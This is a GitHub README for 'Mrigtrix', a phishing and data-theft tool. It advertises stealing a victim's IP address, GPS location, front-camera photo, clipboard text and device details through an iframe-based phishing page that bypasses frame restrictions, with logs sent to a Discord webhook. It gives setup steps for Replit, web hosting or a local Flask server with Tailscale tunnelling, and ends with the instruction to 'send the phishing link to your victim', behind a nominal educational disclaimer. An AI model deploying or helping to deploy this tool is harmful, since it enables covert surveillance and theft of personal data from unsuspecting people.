<div align="center">
<pre>
███╗   ███╗██████╗ ██╗ ██████╗████████╗██████╗ ██╗██╗  ██╗    
████╗ ████║██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝    
██╔████╔██║██████╔╝██║██║  ███╗  ██║   ██████╔╝██║ ╚███╔╝     
██║╚██╔╝██║██╔══██╗██║██║   ██║  ██║   ██╔══██╗██║ ██╔██╗     
██║ ╚═╝ ██║██║  ██║██║╚██████╔╝  ██║   ██║  ██║██║██╔╝ ██╗    
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    
</pre>
</div>

---
# Mrigtrix

**Coded by:** [Anurag Bathani]

If you found this tool useful, consider leaving a star to support future development.

---

## Features

- Steals victim IP address
- Extracts device information
- Captures network and battery status
- Uses device GPS to obtain exact location
- Captures image from front camera
- Extracts clipboard text
- Sends logs to Discord and saves them locally
- Works on Linux-based systems (e.g. Kali, Ubuntu, Parrot OS)
- Uses iframe for realistic phishing attack
- Bypasses x-frame restrictions
- Includes Tailscale tunneling support
- Allows custom port selection for the Flask server

---

## How to Use

### Method 0: Replit

  [![Run on Repl.it](https://repl.it/badge/github/AnuragBathani/Mrigtrix)](https://repl.it/github/AnuragBathani/Mrigtrix)

- Click the above button  or [click here](https://repl.it/github/AnuragBathani/Mrigtrix) to run on `repl.it`
- Login/Signup on [repl.it](https://repl.it)
- After it clones the repo edit <a href="https://github.com/AnuragBathani/Mrigtrix/blob/324ac626f15017354e975d3a04aa52144b3f5442/python_flask/index.html#L233">this</a> line with your repl url
- Now click Run

---
### Method 1: Web Hosting

- Clone or Download this repo
- Create a account on any webhosting site that provide ssl . I suggest a free webhosting site called ```000webhost.com```
- Now upload ```index.html,collector.php,post.php``` on your webhosting site
- Now open index.html and replace <A href="https://github.com/AnuragBathani/Mrigtrix/blob/282851ee043498b50ba31f248dd5baf964522030/index.html#L194">this</a> with your ```discord webhook url```  
- Boom !!! . Now send the phishing link to your victim . Logs will be send to your discord webhook and also saved to ```sensitiveinfo.txt``` file 

---

### Method 2: Local Flask Server

1. Clone the repo and navigate to the python_flask directory
2. Open your terminal and type:
   ```
   pip3 install -r requirements.txt
   ```
3. This will install all required Python packages like flask, colorama, etc.
4. Make sure Tailscale is installed (the script will help you install it if it's missing)
5. You will also be asked to choose a custom port for the Flask server
6. Also the tailscale url will be updated in the index.html file automatically!!.
7. Now type:
   ```
   python3 Mrigtrix.py
   ```

Logs and images will be saved locally.

---

## Disclaimer

This tool is intended for educational purposes only. The developer is not responsible for any misuse.

---

## License

View the license [here](LICENSE).

💡 Keep building, keep breaking — Happy Hacking! 🛠️😎

